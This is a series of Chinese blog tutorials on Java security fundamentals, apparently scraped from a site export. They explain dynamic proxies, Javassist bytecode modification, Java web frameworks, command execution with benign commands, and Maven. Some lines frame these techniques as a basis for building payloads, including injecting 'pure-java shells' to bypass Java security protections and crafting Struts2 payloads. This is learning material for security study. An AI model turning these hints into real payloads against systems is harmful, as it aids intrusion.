JDK动态代理机制的相关类与接口\n\n**java.lang.reflect.Proxy：**该类用于动态生成代理类，只需传入被监控对象隶属的类文件在内存中真实地址、被监控对象隶属的类文件实现接口以及InvocationHandler通知对象便可为目标接口生成代理类及代理对象。\n\n```\n// 方法 1: 该方法用于获取指定代理对象所关联的InvocationHandler static InvocationHandler\ngetInvocationHandler(Object proxy)\n\n// 方法 2：该方法用于获取关联于指定类装载器和一组接口的动态代理类的类对象 static Class\ngetProxyClass(ClassLoader loader, Class[] interfaces)\n\n// 方法 3：该方法用于判断指定类是否是一个动态代理类 static boolean isProxyClass(Class cl)\n\n// 方法 4：该方法用于为指定类装载器、一组接口及调用处理器生成动态代理类实例 static Object\nnewProxyInstance(ClassLoader loader, Class[] interfaces,\nInvocationHandler h)\n```\n\n**java.lang.reflect.InvocationHandler：**该接口包含一个invoke方法，通过该方法实现对委托类的代理的访问，是代理类完整逻辑的集中体现，包括要切入的增强逻辑和进行反射执行的真实业务逻辑。\n\n```\nObject invoke(Object proxy, Method method, Object[] args)\n```\n\n该方法是代理类完整逻辑的集中体现。在被监控行为将要执行时，会被JVM拦截。被监控行为和行为实现方法会被作为参数输送invoke，通常通过反射完成对具体角色业务逻辑的调用，并对其进行增强。\n\n- 第一个参数既是代理类实例。\n- 第二个参数是被调用的方法对象。\n- 第三个方法是调用参数。\n\n**java.lang.ClassLoader：**类加载器类，负责将类的字节码装载到Java虚拟机中并为其定义类对象，然后该类才能被使用。Proxy静态方法生成动态代理类同样需要通过类加载器来进行加载才能使用，它与普通类的唯一区别就是其字节码是由JVM在运行时动态生成的而非预存在于任何一个.class 文件中。JDK动态代理使用步骤\n\n### JDK动态代理的一般步骤\n\n1、创建被代理的接口和类；\n\n2、实现InvocationHandler接口，对目标接口中声明的所有方法进行统一处理；\n\n3、调用Proxy的静态方法，创建代理类并生成相应的代理对象；\n\n4、使用代理。\n\n### 生活案例\n\n**饭前便后要洗手**\n一、分析出主要业务和次要业务\n【主要业务】：吃饭，上厕所\n【次要业务】：洗手\n\n二、JDK代理模式实现\n\n1. 接口角色： 定义所有需要被监听行为\n2. 接口实现类：中国人、印度人\n3. 通知类：\n   - 次要业务进行具体实现\n   - 通知JVM，当前被拦截的主要业务方法与次要业务方法应该如何绑定执行\n\n4. 监控对象（代理对象）\n   - 被监控实例对象 需要被监控的行为\n   - 具体通知类实例对象\n\n### 代码实现\n\n1、定义接口类\n\n```java\npublic interface BaseService {\n    void eat();\n    void wc();\n}\n```\n\n2、编写接口的实现类，即具有某些行为的实体\n\n```java\npublic class Person implements BaseService {\n\n    @Override\n    public void eat() { //主要业务，代理模式要求开发人员只关心主要业务\n        System.out.println(\"吃饭.\");\n    }\n\n    @Override\n    public void wc() {\n        System.out.println(\"上厕所.\");\n    }\n}\n```\n\n3、创建通知类\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\n\npublic class Invocation implements InvocationHandler {\n\n    private BaseService obj;//具体被监控对象\n\n    public Invocation(BaseService param){\n        this.obj = param;\n    }\n\n    /*\n     *\n     *  invoke方法：在被监控行为将要执行时，会被JVM拦截\n     *             被监控行为和行为实现方会被作为参数输送invoke\n     *             ****\n     *             通知JVM,这个被拦截方法是如何与当前次要业务方法绑定实现\n     *  invoke方法三个参数\n     *\n     *           int v= 小明.eat();//JVM拦截\n     *            eat方法封装为Mehtod类型对象\n     *            eat方法运行时接受所有的实参封装到Object[]\n     *            将负责监控小明的代理对象作为invoke方法第一个参数\n     *\n     */\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] params) throws Throwable {\n        //1.局部变量，接受主要业务方法执行完毕后返回值\n        Object value;\n        //2.确认当前被拦截行为\n        String methodName= method.getName();\n        //3.根据被拦截行为不同，决定主要业务和次要业务如何绑定执行\n        if(\"eat\".equals(methodName)){//饭前要洗手\n            wash();                            //洗手\n            value=method.invoke(this.obj, params);   //吃饭\n        }else{//便后要洗手\n            value=method.invoke(this.obj, params);\n            wash();\n        }\n        return value; //返回被拦截方法，需要调用地方\n    }\n\n    //次要业务\n    public void wash(){\n        System.out.println(\"-----洗手----\");\n    }\n}\n```\n\n4、创建监控对象，通过Proxy类的静态方法newProxyInstance创建代理对象\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\nclass ProxyFactory {\n    /*\n     *\n     *  JDK动态代理模式下，代理对象的数据类型\n     *  应该由监控行为来描述\n     *  参数： Class文件，监控类\n     */\n    public static BaseService Builder(Class classFile) throws Exception {\n\n        //1.创建被监控实例对象\n        BaseService obj = (BaseService) classFile.newInstance();\n        //2.创建一个通知对象 用接口来描述\n        InvocationHandler adviser = new Invocation(obj);\n        //3.向JVM申请负责监控obj对象指定行为的监控对象（代理对象）\n        /*\n         *  loader:被监控对象隶属的类文件在内存中真实地址\n         *  interfaces:被监控对象隶属的类文件实现接口\n         *  adviser：监控对象发现小明要执行被监控行为，应该由哪一个通知对象进行辅助\n         */\n        BaseService $proxy = (BaseService) Proxy.newProxyInstance(\n                obj.getClass().getClassLoader(),\n                obj.getClass().getInterfaces(),\n                adviser);\n        return $proxy;\n    }\n}\n```\n\n5、测试\n\n```java\nimport java.lang.*;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        BaseService mike= ProxyFactory.Builder(Person.class);\n        mike.eat();\n        System.out.println(\"================\");\n        mike.wc();\n    }\n}\n```\n\n![](/images/a2/3.png)\n\n\n\n# JAVA动态字节码\n\n## 动态字节码技术\n\nJava 代码都是要被编译成字节码后才能放到 JVM 里执行的，而字节码一旦被加载到虚拟机中，就可以被解释执行。字节码文件（.class）就是普通的二进制文件，它是通过 Java 编译器生成的。而只要是文件就可以被改变，**如果我们用特定的规则解析了原有的字节码文件，对它进行修改或者干脆重新定义，这不就可以改变代码行为了么**。动态字节码技术优势在于 Java 字节码生成之后，对其进行修改，增强其功能，这种方式相当于对应用程序的二进制文件进行修改。\n\n通过动态编程的方式，我可以直接对已经存在的java字节码进行操作，也可以在内存中动态生成JAVA代码，动态编译执行，在安全中常用于生成payload，这种方式生成的payload优点：**能够注入pure-java的shell来绕过java原生的安全防护。**\n\nJava 生态里有很多可以动态处理字节码的技术，比较流行的有两个，一个是 ASM，一个是 Javassist 。\n\n- ASM：直接操作字节码指令，执行效率高，但涉及到JVM的操作和指令，要求使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。\n\n- Javassist：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，简单、快速，对使用者要求较低。\n\n## Javassist简介\n\nJavassist 是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，**在于简单，而且快速。直接使用 java 编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。**\n\nJavassist 中最为重要的是 **ClassPool，CtClass ，CtMethod 以及 CtField** 这几个类。\n\n```\nClassPool：一个基于 Hashtable 实现的 CtClass 对象容器，其中键是类名称，值是表示该类的 CtClass 对象。\nCtClass：CtClass 表示类，一个 CtClass (编译时类）对象可以处理一个 class 文件，这些 CtClass 对象可以从 ClassPool 获得。\nCtMethods：表示类中的方法。\nCtFields ：表示类中的字段。\n```\n\n下面以简单的一个实例来说明下基本的使用方法。这个实例是在执行完类中的方法时候加入一些操作。\n\n1、定义个测试类User\n\n```java\npackage com.demo.manba;\n\nimport java.lang.String;\n\npublic class User {\n    private String name;\n\n    public User() {\n    }\n\n    public String getUser() {\n        return this.name;\n    }\n\n    public void setUser(String name) {\n        this.name = name;\n    }\n\n}\n```\n\n2、 执行\n\n```java\npackage com.demo.manba;\n\nimport javassist.*;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class DynGenerateClass {\n    public static void main(String[] args) throws NotFoundException, CannotCompileException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n            // 获取默认池\n            ClassPool pool = ClassPool.getDefault();\n            CtClass cc = pool.get(\"com.demo.manba.User\");\n            // 获取所有方法\n            CtMethod[] cms = cc.getDeclaredMethods();\n            for(CtMethod cm:cms){\n                System.out.println(cm.getName());\n            }\n            // 在执行setUser方法后执行\n            cms[1].insertAfter(\"System.out.println(\\\"I hava execute setUser Success.\\\");\");\n            Class clazz = cc.toClass();\n            // 实例化\n            User u=(User) clazz.getConstructor(new Class[]{}).newInstance(new Object[]{});\n            u.setUser(\"mike\");\n            System.out.println(u.getUser());\n            // cc.writeFile();\n        }\n\n}\n```\n\n输出\n\n![](/images/a2/4.png)\n\n**参考：**\n\nhttps://blog.csdn.net/a745233700/article/details/82893076\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/87974728\n\nhttps://blog.csdn.net/justloveyou_/article/details/79407248\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/78266299\n","tags":["JAVA","动态代理","反射"],"categories":["JAVA安全教程"]},{"title":"JAVA框架介绍","url":"/2018/12/04/JAVA框架介绍/","content":"# 什么是框架\n\n在编程领域，软件框架是指一种抽象形式，它提供了一个具有通用功能的软件，这些功能可以由使用者编写代码来有选择的进行更改，从而提供服务于特定应用的软件。软件框架提供了一种标准的方式来构建并部署应用。\n<!-- more -->\n# Struts2框架介绍\n\n直接上图\n\n![](/images/a3/1.png)\n\nStruts2框架最主要的两个组件就是过滤器和拦截器，其中用到的思想就是上一章的反射和动态代理。\n\n**工作流程：**\n\n1. 客户端浏览器发送HTTP请求到Web应用\n2. Web容器将请求传递到标准ActionContextCleanUp过滤器以消除属性，而不让后续过滤器清楚，以延长Action中属性（包括自定义属性）的生命周期。\n3. 再经过如stimesh等其他过滤器后，请求传递给StrutsPrepareAndExecuteFilter核心控制器\n4. StrutsPrepareAndExecuteFilter调用ActionMapper（Action映射器）确定调用哪个Action，再将控制权转移给ActionProxy代理\n5. ActionProxy代理调用配置管理器ConfigurationManager从配置文件struts.xml中读取配置信息，然后创建ActionInvocation对象\n6. ActionInvocation在调用拦截器链中的拦截器后再调用Action，根据Action返回的结果字符串查找对应的Result\n7. Result调用视图模板，再以相反的顺序执行拦截器链，返回HTTP响应\n8. HTTP响应以相反的顺序返回给核心控制器StrutsPrepareAndExecuteFilter以及其他web.xml中定义的过滤器，最终返回给客户端\n\nstruts2可以说是上一代的web框架，现在基本很少互联网会使用strust2，一来安全问题较多，二来现在有更方便的springboot框架，基本可以说被遗弃了。但是作为安全学习，我们还是有必要了解下基本的框架体系，如果想要深入的学习，可以网上自己搜索，作为曾经火遍大江南北的web框架，网上资料还是很多的。\n\n# Spring框架介绍\n\nspring是一个一站式开发框架集，功能十分强大，就像一个大家族，有众多衍生产品，例如：springboot、springcloud、springsecurity等等。但他们都是基于spring的ioc和aop，**ioc提供了依赖注入的容器，aop解决了面向切面的编程**，然后在这两者的基础上实现了其他衍生产品的高级功能。\n\n## 什么是IOC\n\n控制反转（Inversion of Control）不是技术，是一种**设计思想**。所谓控制反转是指，本来被调用者的实例是由调用者来创建的，这样的缺点是耦合性太强，IOC则是统一交给spring来管理创建，将对象交给容器管理，你只需要在spring配置文件总配置相应的bean，以及设置相关的属性，让spring容器来生成类的实例对象以及管理对象。在spring容器启动的时候，spring会把你在配置文件中配置的bean都初始化好，然后在你需要调用的时候，就把它已经初始化好的那些bean分配给你需要调用这些bean的类。 \n\n传统设计\n\n![](/images/a3/2.png)\n\nioc思想\n\n![](/images/a3/3.png)\n\n## 什么是AOP\n\n面向切面编程（Aspect Oriented Programming）它与 OOP( Object-Oriented Programming, 面向对象编程) 相辅相成，提供了与 OOP 不同的抽象软件结构的视角来思考程序的结构，通过这种方式弥补面向对象编程(Object Oriented Programming)的不足。除了类以外，AOP提供了切面，切面对关注点进行模块化，例如横切多个类型和对象的事务管理（这些关注点术语通常称作横切(crosscutting)关注点）。Spring AOP是Spring的一个重要组件，但是Spring IOC并不依赖于Spring AOP，这意味着你可以自由选择是否使用AOP，AOP提供了强大的中间件解决方案，这使得Spring IOC更加完善。我们可以通过AOP来实现**日志监听，事务管理，权限控制**等等。\n\n**概念：**\n\n```\n切面（Aspect）：一个关注点的模块化，这个关注点可能会横切多个对象。事务管理是J2EE应用中一个关于横切关注点的很好的例子。在Spring AOP中，切面可以使用基于模式）或者基于@Aspect注解的方式来实现。\n\n连接点（Joinpoint）：在程序执行过程中某个特定的点，比如某方法调用的时候或者处理异常的时候。在Spring\nAOP中，一个连接点总是表示一个方法的执行。\n\n通知（Advice）：在切面的某个特定的连接点上执行的动作。其中包括了“around”、“before”和“after”等不同类型的通知（通知的类型将在后面部分进行讨论）。许多AOP框架（包括Spring）都是以拦截器做通知模型，并维护一个以连接点为中心的拦截器链。\n\n切入点（Pointcut）：匹配连接点的断言。通知和一个切入点表达式关联，并在满足这个切入点的连接点上运行（例如，当执行某个特定名称的方法时）。切入点表达式如何和连接点匹配是AOP的核心：Spring缺省使用AspectJ切入点语法。\n\n引入（Introduction）：用来给一个类型声明额外的方法或属性（也被称为连接类型声明（inter-type\ndeclaration））。Spring允许引入新的接口（以及一个对应的实现）到任何被代理的对象。例如，你可以使用引入来使一个bean实现IsModified接口，以便简化缓存机制。\n\n目标对象（Target Object）： 被一个或者多个切面所通知的对象。也被称做被通知（advised）对象。 既然Spring\nAOP是通过运行时代理实现的，这个对象永远是一个被代理（proxied）对象。\n\nAOP代理（AOP Proxy）：AOP框架创建的对象，用来实现切面契约（例如通知方法执行等等）。在Spring中，AOP代理可以是JDK动态代理或者CGLIB代理。\n\n织入（Weaving）：把切面连接到其它的应用程序类型或者对象上，并创建一个被通知的对象。这些可以在编译时（例如使用AspectJ编译器），类加载时和运行时完成。Spring和其他纯Java AOP框架一样，在运行时完成织入。\n\n通知类型：\n\n前置通知（Before advice）：在某连接点之前执行的通知，但这个通知不能阻止连接点之前的执行流程（除非它抛出一个异常）。\n\n后置通知（After returning advice）：在某连接点正常完成后执行的通知：例如，一个方法没有抛出任何异常，正常返回。\n\n异常通知（After throwing advice）：在方法抛出异常退出时执行的通知。\n\n最终通知（After (finally) advice）：当某连接点退出的时候执行的通知（不论是正常返回还是异常退出）。\n\n环绕通知（Around Advice）：包围一个连接点的通知，如方法调用。这是最强大的一种通知类型。环绕通知可以在方法调用前后完成自定义的行为。它也会选择是否继续执行连接点或直接返回它自己的返回值或抛出异常来结束执行。\n```\n\n看完了上面的理论部分知识, 相信大家还是对AOP 的概念云里雾里的, 因为 AOP 中的概念是在是太多了, 我们也不必理解的那么透彻，直接从网上找个例子说明一下 AOP 中 Aspect，Joint point，Point cut 与 Advice之间的关系。\n\n```\n让我们来假设一下，从前有一个叫爪哇的小县城，在一个月黑风高的晚上，这个县城中发生了命案。 作案的凶手十分狡猾，现场没有留下什么有价值的线索。不过万幸的是，刚从隔壁回来的老王恰好在这时候无意中发现了凶手行凶的过程，但是由于天色已晚，加上凶手蒙着面，老王并没有看清凶手的面目，只知道凶手是个男性，身高约七尺五寸。 爪哇县的县令根据老王的描述，对守门的士兵下命令说: 凡是发现有身高七尺五寸的男性，都要抓过来审问。 士兵当然不敢违背县令的命令，只好把进出城的所有符合条件的人都抓了起来。\n\n来让我们看一下上面的一个小故事和 AOP 到底有什么对应关系。\n\n首先我们知道，在 Spring AOP 中 Joint point 指代的是所有方法的执行点，而 point cut 是一个描述信息，它修饰的是 Joint point，通过 point cut，我们就可以确定哪些 Joint point 可以被织入 Advice。 对应到我们在上面举的例子，我们可以做一个简单的类比，Joint point 就相当于 爪哇的小县城里的百姓,pointcut 就相当于 老王所做的指控，即凶手是个男性，身高约七尺五寸，而 Advice 则是施加在符合老王所描述的嫌疑人的动作: 抓过来审问。\n为什么可以这样类比呢?\n\nJoint point ： 爪哇的小县城里的百姓: 因为根据定义，Joint point 是所有可能被织入 Advice 的候选的点，在 Spring AOP中，则可以认为所有方法执行点都是 Joint point。 而在我们上面的例子中，命案发生在小县城中，按理说在此县城中的所有人都有可能是嫌疑人。\n\nPointcut ：男性，身高约七尺五寸: 我们知道，所有的方法(joint point) 都可以织入 Advice，但是我们并不希望在所有方法上都织入 Advice，而 Pointcut 的作用就是提供一组规则来匹配join point，给满足规则的 join point 添加 Advice。 同理，对于县令来说，他再昏庸，也知道不能把县城中的所有百姓都抓起来审问，而是根据凶手是个男性，身高约七尺五寸，把符合条件的人抓起来。 在这里 凶手是个男性，身高约七尺五寸 就是一个修饰谓语，它限定了凶手的范围，满足此修饰规则的百姓都是嫌疑人，都需要抓起来审问。\n\nAdvice ：抓过来审问，Advice 是一个动作，即一段 Java 代码，这段 Java 代码是作用于 point cut 所限定的那些 Joint point 上的。 同理，对比到我们的例子中，抓过来审问 这个动作就是对作用于那些满足 男性，身高约七尺五寸 的爪哇的小县城里的百姓。\n\nAspect:：Aspect 是 point cut 与 Advice 的组合，因此在这里我们就可以类比: “根据老王的线索，凡是发现有身高七尺五寸的男性，都要抓过来审问” 这一整个动作可以被认为是一个 Aspect。\n```\n\n说完AOP专业名词的概念，再来说下AOP具体的。相信大家对于OOP的理解不难，就以人（people）来说，我们就可以把它看做一类对象，people有身高、体重、年龄等属性，也有跑步、吃饭、睡觉、娱乐等行为，把这些属于people的属性和行为封装在people类中，然后以统一调用的方式（创建一个people类实例对象，通过这个对象实例来调用这些属性和行为）就叫做OOP思想。\n\nOOP给我们的感觉就是结构清晰，高内聚，易维护等。这些属于一种从上到下的关系（即这个类封装的所有属性和方法都是属于people的），而我们的AOP思想就是一种从左到右的关系，以切入的方式将业务逻辑功能应用到每一层结构中（可以理解为类方法，类方法也是一种对象的行为实现）。\n\n举个例子，people也可以分为少年、青年、中年、和老年，这几类人除了拥有自己的属性和行为外，生活中，或许还需要去医院看病，但是医院看病这一个逻辑业务功能并不是属于哪一类，而是谁生病了，才需要到医院看病，而基于面向对象编程的思想，我们是不可能把这一个业务逻辑行为加到每一个类中的，这不符合OOP思想，而这个就是AOP所做也可以做到事情了，AOP就是把医院看病这一个业务逻辑功能抽取出来，然后动态把这个功能注入到需要的方法（或行为）中，以后，不管是谁需要看病，就到医院这个第三方机构看病（AOP就是相当于把这个第三方机构独立出来），**这样从业务逻辑角度上，AOP达到了更近一步的的解耦，所以我们也称AOP是对OOP的完善和增强。**\n\n而我们的编程中，常用到AOP的就是安全校验、日志操作、事务操作等，接下来一张图认识AOP思想：\n\n![](/images/a3/4.png)\n\n AOP就是使用上图所示的“横切”技术，AOP把软件系统分为两个部分：**核心关注点和横切关注点**。业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处都基本相似。比如权限认证、日志、事务处理。Aop 的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。正如Avanade公司的高级方案构架师Adam Magee所说，AOP的核心思想就是**“将应用程序中的商业逻辑同对其提供支持的通用服务进行分离。”**\n\n## SpringMVC框架\n\n**SpringMVC** 是基于 Java 语言实现 MVC 设计模式的请求驱动类型的轻量级 Web 框架，目的是将 Web 开发模块化及代码简化。其提供了 DispatcherServlet 前端控制器分派请求，同时提供灵活的配置处理程序映射、视图解析，并支持文件上传。\n\n![](/images/a3/5.png)\n\n\n\n## MyBatis框架\n\nMyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\n\n![](/images/a3/6.png)\n\n**MyBatis 的优点如下：**\n\n- 封装了 JDBC 大部分操作，减少开发人员工作量；\n- 相比一些自动化的 ORM 框架，“半自动化”使得开发人员可以自由的编写 SQL 语句，灵活度更高；\n- Java 代码与 SQL 语句分离，降低维护难度；\n- 自动映射结果集，减少重复的编码工作；\n- 开源社区十分活跃，文档齐全，学习成本不高。\n\n## SpringBoot框架\n\n### 什么是SpringBoot\n\nSpring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架（不知道这样比喻是否合适）。\n\n### SpringBoot四个主要特性\n\n1. SpringBoot Starter：他将常用的依赖分组进行了整合，将其合并到一个依赖中，这样就可以一次性添加到项目的Maven或Gradle构建中；\n\n2. 自动配置：SpringBoot的自动配置特性利用了Spring4对条件化配置的支持，合理地推测应用所需的bean并自动化配置他们；\n\n3. 命令行接口：（Command-line-interface, CLI）：SpringBoot的CLI发挥了Groovy编程语言的优势，并结合自动配置进一步简化Spring应用的开发；\n\n4. Actuatir：它为SpringBoot应用的所有特性构建一个小型的应用程序。\n\n**简单来说，springboot也是属于spring框架中的一种，但是springboot”约定大于配置“的丽娘，极大简化了spring应用的初始搭建以及开发过程**\n\n# 框架比较\n\n**struts2 和 springMvc：**\n\n1. springmvc入口是一个servlet前端控制器(DispatcherServlet)，struts2入口是一filter过滤器(StrutsPrepareAndExecuteFilter)。\n\n2. struts2通过在action类中定义成员变量接收参数，(属性驱动和模型驱动)，它只能使用多例模式管理action。springmvc通过在coontroller方法中定义形参接收参数，springmvc可以使用单例模式管理controller。 \n\n3. springmvc是基于方法开发的，注解开发中使用requestMapping将url和方法进行映射，如果根据url找到controller类的方法生成一个handler处理器对象(只包括一个method)。struts2是基于类开发的，每个请求过来创建一个action实例，实例对象中有若干个方法。开发中建议使用springmvc，springmvc方法更类似service业务方法。\n4. struts2采用值栈存储请求和相应的数据,通过OGNL存取数据，springmvc通过参数绑定期将request请求内容解析，并给方法形参赋值。\n5. struts2和springmvc的速度是相当的，由于struts2的漏洞较多，更多企业使用springmvc。\n\n**springMvc和springBoot：**\n\n1. springMvc属于一个企业WEB开发的MVC框架，涵盖面包括前端视图开发、文件配置、后台接口逻辑开发等，XML、config等配置相对比较繁琐复杂。\n2. springBoot框架相对于springMvc框架来说，更专注于开发微服务后台接口，不开发前端视图。\n\n\n**参考：**\n\nhttps://mybatis.org/mybatis-3/zh/index.html\n\nhttps://blog.csdn.net/qq_42494445/article/details/83926216\n\nhttps://blog.csdn.net/qq_41701956/article/details/81215309\n\nhttps://blog.csdn.net/wangzhidong_java/article/details/82974503","tags":["JAVA","安全"],"categories":["JAVA安全教程"]},{"title":"JAVA基础教程","url":"/2018/11/26/JAVA基础教程/","content":"\n# 简介\n\n本篇是整个java安全学习系列的基础篇，这个系列篇章我会把我的整个java安全学习过程进行一个总结。至于为什么想写这个系列文章，是因为当时听了小伙伴的分享中提到“21小时可以入门任何课程”，看了他整理的学习导图，深受启发。所以，我打算把过去的和新学习的东西，完整的、系统的归纳总结出来，做到温故而知新。\n\n# 学习流程\n\n![](/images/a1/1.png)\n\n这个是我整理的java的学习路线图，每个人可能有不同的理解，大家可以自己动手进行自己的学习规划。并且学习过程是动态的，可能在学习总结过程中，我会修增某些模块。本篇我将对第一部分-基础，进行讲解。\n\n# java基础\n\n这边讨论的基础，不是java的基础语法，这部分自己可以快速入门学习。我要讲的部分，是java的一些特性，或者比较重要的语法，在看代码中或者分析payload经常用到的。这部分是我在实践过程中觉得难点和重点，每个人的理解方法不同，所以并不适用所有人的学习，不过理解以下概念方法对于java安全学习是有帮助的，这点可以肯定。\n\n## 基本语法\n\n### 泛类型\n\n泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？\n\n顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。\n\n泛型的本质是为了参数化类型（在不创建新的类型的情况下，通过泛型指定的不同类型来控制形参具体限制的类型）。也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。\n\n最典型的泛型类应用就是各种容器类，如：List、Set、Map。自己定义的泛型类形式如下：\n\n```java\n//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型\n//在实例化泛型类时，必须指定T的具体类型\npublic class Generic<T>{ \n    //key这个成员变量的类型为T,T的类型由外部指定  \n    private T key;\n\n    public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定\n        this.key = key;\n    }\n\n    public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定\n        return key;\n    }\n}\n```\n\n更多泛型基本知识内容可参考：[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\n### 对象类型、基本类型\n\nJava中的对象分两种类型：**基本类型和非基本类型（对象类型）。**\n\n基本类型就是那些最常用的类型，例如：boolean/char/byte/short/int/long/float/double，这些类型有个特点，就是变量直接存储值。\n\n除了基本类型之外的都是非基本类型了。非基本类型有个显著特点就是初始化的时候一般需要使用new来创建一个对象，所以非基本类型也叫非基本类型。例如:String name=new String(Tom);。非基本类型跟基本类型的本质区别，在于**非基本类型变量存储的不是值，而是引用。**\n\n## 命令执行的方法\n\njava命令执行，主要有两种方法Runtime.getRuntime().exec(cmd) 和ProcessBuilder(cmd).start，实例如下：\n\n```java\npackage com.manba.demo;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CmdTest {\n    public static void rexec() throws IOException {\n        String cmds = \"/bin/sh -c pwd\"; // 也可以数组形式\n        Process process = Runtime.getRuntime().exec(cmds);\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void pexexc() throws IOException {\n        String[] cmds = {\"/bin/sh\", \"-c\", \"ls\"}; // 只能数组形式\n        Process pb = new ProcessBuilder(cmds).start();\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(pb.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void main(String[] args) throws IOException {\n        rexec();\n        pexexc();\n    }\n\n}\n```\n\n这两个方法的主要区别在于Runtime.getRuntime.exec是静态方法，而ProcessBuilder().start不是静态方法，这在strust2中构造payload，是很有用的。\n\n## Java Bean和Factory概念\n\n**JavaBeans**：Java中一种**特殊的类**，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。\n\n```java\npackage com.manba.demo; \npublic class SimpleBean{  \n    private String name;  \n    private int age;  \n    public void setName(String name){  \n        this.name = name;  \n    }  \n    public void setAge(int age){  \n        this.age = age;  \n    }  \n    public String getName(){  \n        return this.name;  \n    }  \n    public int getAge(){  \n        return this.age;  \n    }  \n}  \n```\n\n**总结如下：**\n\n1. 所有的类必须声明为public \n\n2. 所有属性为private\n3. 提供默认构造方法\n4. 提供getter和setter\n5. 实现serializable接口\n\n**Java Factory定义**：定义一个创建对象的接口，但让实现这个接口的类来决定实例化哪个类，工厂方法让类的实例化推迟到了子类中进行，它属于创建类型。\n\n```\n通俗理解与做法：\n\t\t定义一个抽象类或者接口来当规范工厂，它是一个只声明方法叫什么名字不实现方法的内容的一个规范类；\n  \t定义具体工厂实现或者继承规范工厂，然后重写规范工厂中定义的方法，在该方法中生产属于自己工厂的对象;\n  \t使用的时候，new工厂的时候是具体工厂给规范工厂进行赋值。即=号左边是规范工厂类型，右边是具体工厂类型，想获哪个具体工厂生产的对象就使用哪个具体工厂类型，最后利用对象调用方法来获取具体工厂生产的;\n\n注意点：\n\t\t要有一个规范工厂，该工厂只负责声明方法叫什么名字，不实现方法的内容;\n    每一个具体工厂都要继承或者实现规范工厂，重写它的方法，在方法中生产自己工厂的对象;\n    使用的时候一定要具体工厂给规范工厂进行赋值;\n```\n\n代码案例：\n\n```java\n//StandardFactory----规范工厂      \n//SpecificFactory----具体工厂       \npackage com.manba.demo;\n\npublic class Product {\n    interface StandardFactory {\n        public Product createProduct();\t\t//声明了方法叫这个名字\n    }\n\n    static class SpecificFactory implements StandardFactory {\n        @Override\n        public Product createProduct() {\t//具体工厂实现规范工厂并重写它的方法生产属于工厂的对象\n            return new Product();         //这是属于该具体工厂生产的对象\n        }\n    }\n\n    public static class Client {\n        public static void main(String[] args) {\n            StandardFactory factory = new SpecificFactory();\n            Product prodect = factory.createProduct();\n        }\n    }\n}\n```\n\n## Java Maven\n\nMaven 翻译为\"专家\"、\"内行\"，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。\n\nPOM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。执行任务或目标时，Maven 会在当前目录中查找 POM。它读取 POM，获取所需的配置信息，然后执行目标。\n\nPOM 中可以指定以下配置：\n\n- 项目依赖\n- 插件\n- 执行目标\n- 项目构建 profile\n- 项目版本\n- 项目开发者列表\n- 相关邮件列表信息\n\n**Maven 参数**\n\n-D 传入属性参数 \n-P 使用pom中指定的配置 \n-e 显示maven运行出错的信息 \n-o 离线执行命令,即不去远程仓库更新包 \n-X 显示maven允许的debug信息 \n-U 强制去远程参考更新snapshot包 \n其他参数可以通过mvn help 获取\n\n**1、mvn clean** \n\n说明: 清理项目生产的临时文件,一般是模块下的target目录\n\n**2、mvn package** \n\n说明: 项目打包工具,会在模块下的target目录生成jar或war等文件，如下运行结果\n\n**3、mvn test** \n\n说明: 测试命令,或执行src/test/java/下junit的测试用例\n\n**4、mvn install** \n\n说明: 模块安装命令 将打包的的jar/war文件复制到你的本地仓库中，供其他模块使用。 -Dmaven.test.skip=true 跳过测试(同时会跳过test compile)\n\n**5、mvn deploy** \n\n说明: 发布命令 